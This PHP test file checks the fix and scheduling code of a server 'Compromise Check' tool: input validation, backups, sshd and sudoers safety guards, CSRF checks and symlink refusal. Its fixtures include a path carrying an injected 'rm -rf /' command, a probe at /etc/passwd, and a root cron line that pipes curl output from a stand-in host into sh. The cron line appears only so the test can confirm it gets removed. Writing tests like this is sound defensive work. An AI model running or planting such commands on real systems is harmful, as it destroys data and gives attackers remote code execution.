<?php
require __DIR__ . '/../support/bootstrap.php';
require_once SMPRO_BASE . '/includes/compcheck.php';
require_once SMPRO_BASE . '/includes/ccfix.php';
/**
 * t91_ccfix.php — Compromise Check fixes and schedule: every fix validates its arguments, backs up before it
 * changes anything, refuses what it must refuse; the schedule is due exactly once per slot; the page wires it.
 */
$sb = $GLOBALS['__sandbox'];

/* ---------- U1: argument validation is the first gate ---------- */
$r = smpro_cx_apply('nonsense', []);           is_eq($r['ok'], false, 'U1: unknown op refused');
$r = smpro_cx_apply('line_rm', ['file' => '/etc/cron.d/x; rm -rf /', 'sha' => str_repeat('a', 40)]);
is_eq($r['ok'], false, 'U1: a file path with shell characters is refused'); has($r['msg'], 'refused', 'U1: ...and says so');
$r = smpro_cx_apply('line_rm', ['file' => '/etc/passwd', 'sha' => str_repeat('a', 40)]);
is_eq($r['ok'], false, 'U1: a file outside the persistence set is refused'); has($r['msg'], 'not one this fix may edit', 'U1: ...by the allow-list');
$r = smpro_cx_apply('rootkey_rm', ['sha' => 'zz']);          is_eq($r['ok'], false, 'U1: a malformed sha is refused');
$r = smpro_cx_apply('roottok_revoke', ['name' => 'reverse_trust_abc']); is_eq($r['ok'], false, 'U1: a cPanel transfer token is never revoked'); has($r['msg'], 'transfer token', 'U1: ...and it says why');
$r = smpro_cx_apply('wheel_rm', ['user' => 'root']);          is_eq($r['ok'], false, 'U1: root is never taken out of wheel');
$r = smpro_cx_apply('ftp_delete', ['user' => 'bob', 'login' => 'no-at-sign']); is_eq($r['ok'], false, 'U1: an FTP login without @ is refused');

/* ---------- U2: line_rm backs up first, removes exactly the line, keeps the rest ---------- */
@mkdir($sb . '/etc/cron.d', 0700, true);
$f = $sb . '/etc/cron.d/evil';   // the allow-list is on real paths; exercise the primitive directly on a sandbox file
file_put_contents($f, "# comment\n0 * * * * root /usr/bin/true\n*/5 * * * * root curl -s http://x/a | sh\n");
[$n, $bk] = smpro_cx_line_rm($f, sha1('*/5 * * * * root curl -s http://x/a | sh'));
is_eq($n, 1, 'U2: exactly one line removed');
ok($bk !== '' && is_file($bk), 'U2: a backup exists');
is_eq(file_get_contents($bk), "# comment\n0 * * * * root /usr/bin/true\n*/5 * * * * root curl -s http://x/a | sh\n", 'U2: the backup is the original, byte for byte');
is_eq(file_get_contents($f), "# comment\n0 * * * * root /usr/bin/true\n", 'U2: the routine line and the comment survive');
[$n2, $bk2] = smpro_cx_line_rm($f, sha1('nothing like this'));
is_eq($n2, 0, 'U2: a sha that matches nothing removes nothing'); is_eq($bk2, '', 'U2: ...and makes no backup');
ok(strpos($bk, SMPRO_VARLIB . '/backups/compcheck/') === 0, 'U2: backups live under the product\'s var dir');
ok(is_file(dirname($bk) . '/ORIGIN.txt'), 'U2: the backup folder names its origin');

/* ---------- U3: sshd_harden refuses without a root key (the lockout guard) ---------- */
$src = str_replace(chr(13), '', (string)file_get_contents(SMPRO_BASE . '/includes/ccfix.php'));
has($src, "if (!\$keys) { \$r = ['ok' => false, 'msg' => 'refused: /root/.ssh/authorized_keys holds no key", 'U3: no key, no hardening');
has($src, "sshd -t 2>&1", 'U3: the result is validated with sshd -t');
has($src, "@copy(\$bk, \$cfg); \$r = ['ok' => false, 'msg' => 'sshd -t rejected the change, original restored", 'U3: ...and restored when sshd rejects it');
has($src, "visudo -c 2>&1", 'U3: a sudoers edit is validated with visudo -c and restored on error');
has($src, "smpro_cx_backup(\$cfg); if (\$bk === '') { \$r = ['ok' => false, 'msg' => 'could not back up sshd_config - nothing changed'", 'U3: no backup, no change');
has($src, "@smpro_audit('compromise_fix'", 'U3: every fix is audited');
hasnt($src, "\$_POST['op']", 'U3: the include never reads the request itself - the page validates and passes');

/* ---------- U4: what the doors carry ---------- */
$cc = str_replace(chr(13), '', (string)file_get_contents(SMPRO_BASE . '/includes/compcheck.php'));
has($cc, "['op' => 'ftp_delete', 'user' => \$u, 'login' => \$login]", 'U4: FTP sub-account carries its fix');
has($cc, "['op' => 'fwd_delete', 'user' => \$u, 'address' =>", 'U4: forwarder carries its fix');
has($cc, "\$sus ? ['op' => 'cron_clean', 'user' => \$u] : []", 'U4: cron offers a fix only when a line is suspicious');
has($cc, "['op' => 'token_revoke', 'user' => \$u, 'name' => \$name, 'alt' =>", 'U4: token carries its fix (revoke, with disable beside it)');
has($cc, "'fixes' => \$hOn ? [] : [['op' => 'cphulk_on']]", 'U4: cPHulk fix only when off');
has($cc, "'fixes' => (preg_match('/passwordauthentication yes/i', \$pa) && \$keys) ? [['op' => 'sshd_harden']] : []", 'U4: sshd fix only with a root key present');
has($cc, "'sha' => sha1(\$l), 'what' => basename(\$f)", 'U4: a persistence line is identified by its sha, never by a line number');

/* ---------- U5: the schedule ---------- */
$c = smpro_cx_sched_normalize(['enabled' => 1, 'every' => 'weekly', 'hour' => 99, 'dow' => 9, 'scope' => 'x', 'users' => ['ok_user', 'bad user', 'a;b'], 'days' => 12, 'tell' => 'nope']);
is_eq($c['hour'], 23, 'U5: hour clamped'); is_eq($c['dow'], 6, 'U5: dow clamped'); is_eq($c['scope'], 'both', 'U5: bad scope falls to both');
is_eq($c['users'], ['ok_user'], 'U5: only well-formed account names survive'); is_eq($c['days'], 30, 'U5: bad window falls to 30'); is_eq($c['tell'], 'issues', 'U5: bad tell falls to issues');
$c = smpro_cx_sched_normalize(['enabled' => true, 'every' => 'daily', 'hour' => 4, 'last_run' => 0]);
$t = mktime(4, 5, 0, 6, 10, 2026);
ok(smpro_cx_due($c, $t), 'U5: due at 04:05 when never run');
ok(!smpro_cx_due($c, mktime(5, 5, 0, 6, 10, 2026)), 'U5: not due at 05:05 (the hour has passed - the next slot is tomorrow)');
$c['last_run'] = $t; ok(!smpro_cx_due($c, $t + 600), 'U5: not due twice in the same slot');
ok(smpro_cx_due($c, $t + 86400), 'U5: due again next day');
$c['every'] = 'weekly'; $c['dow'] = (int)date('w', $t + 86400); $c['last_run'] = 0;
ok(smpro_cx_due($c, $t + 86400), 'U5: weekly on its day'); ok(!smpro_cx_due($c, $t + 2 * 86400), 'U5: weekly not on another day');
$c['enabled'] = false; ok(!smpro_cx_due($c, $t + 86400), 'U5: off is off');
ok(smpro_cx_sched_save(smpro_cx_sched_normalize(['enabled' => true])), 'U5: saving works in the sandbox');
is_eq(smpro_cx_sched_cfg()['enabled'], true, 'U5: ...and reads back');
ok(is_file(SMPRO_BASE . '/bin/compcheck_tick.php'), 'U5: the tick script ships');
has($src, '*/10 * * * * root', 'U5: the cron is a ten-minute heartbeat; the tick decides');
has($src, "if (!\$c['enabled']) { if (@is_file(SMPRO_CX_CRON) && !defined('SMPRO_TEST_SRC')) @unlink(SMPRO_CX_CRON); return true; }", 'U5: off removes the cron');
$nt = str_replace(chr(13), '', (string)file_get_contents(SMPRO_BASE . '/includes/notify.php'));
has($nt, "'compromise_check' => ['Compromise Check (scheduled scan)'", 'U5: the notification type is registered');

/* ---------- U6: the page ---------- */
$mod = str_replace(chr(13), '', (string)file_get_contents(SMPRO_BASE . '/modules/compromise-check.php'));
has($mod, "smpro_require_valid_csrf('cc_fix')", 'U6: a fix needs the CSRF token');
has($mod, "smpro_require_valid_csrf('cc_sched')", 'U6: the schedule too');
has($mod, 'list="ccUsers"', 'U6: the account field suggests the cPanel users');
has($mod, "preg_split('/[\\s,;]+/', (string)(\$_GET['user'] ?? ''))", 'U6: several accounts, comma-separated');
has($mod, "class=\"cc-br", 'U6: the tree has branches'); has($mod, "class=\"cc-arr\"", 'U6: ...with arrows');
has($mod, "\$gw === 'critical' ? ' open' : ''", 'U6: a branch opens by itself only when something in it is critical');
has($mod, "if (\$fixes && \$c['status'] !== 'ok' && !\$stored)", 'U6: no fix button on an OK row or a stored report');
has($mod, "confirm(b.getAttribute('data-confirm')", 'U6: every fix asks first');
has($mod, "smpro_cx_report_get(\$repId)", 'U6: stored reports open in the same page');

/* ---------- U14: root never writes through a link or a foreign-owned file in an account's home ---------- */
$d = $sb . '/acct'; @mkdir($d . '/.ssh', 0700, true);
file_put_contents($d . '/.ssh/authorized_keys', "ssh-ed25519 AAAA test\n");
is_eq(smpro_cx_account_file_ok($d . '/.ssh/authorized_keys', (int)fileowner($d . '/.ssh/authorized_keys')), '', 'U14: a plain file owned by the account is fine');
ok(smpro_cx_account_file_ok($d . '/.ssh/authorized_keys', 999999) !== '', 'U14: a file owned by somebody else is refused');
is_eq(smpro_cx_account_file_ok($d . '/nope', 0), 'missing', 'U14: a missing file is "missing", not an error');
if (function_exists('symlink') && @symlink($d . '/.ssh/authorized_keys', $d . '/link')) {
    ok(strpos(smpro_cx_account_file_ok($d . '/link', (int)fileowner($d . '/.ssh/authorized_keys')), 'symlink') !== false, 'U14: a symlink is refused even when its target is fine');
}
$src2 = str_replace(chr(13), '', (string)file_get_contents(SMPRO_BASE . '/includes/ccfix.php'));
has($src2, "if ((\$why = smpro_cx_account_file_ok(\$kf, (int)\$pw['uid'])) !== '')", 'U14: sshkey_clear checks before it truncates');
has($src2, "if (smpro_cx_account_file_ok(\$p, (int)\$pw['uid']) !== '') continue;", 'U14: rc_clean checks every file');
$cc2 = str_replace(chr(13), '', (string)file_get_contents(SMPRO_BASE . '/includes/compcheck.php'));
has($cc2, "authorized_keys is a SYMLINK ->", 'U14: a symlinked authorized_keys is reported as the finding and gets no fix button');
